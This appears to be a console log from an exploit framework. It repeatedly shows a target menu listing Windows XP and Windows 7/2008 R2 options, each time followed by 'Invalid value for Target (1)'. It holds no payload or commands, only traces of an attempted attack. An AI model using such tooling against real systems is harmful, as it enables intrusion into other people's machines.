   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

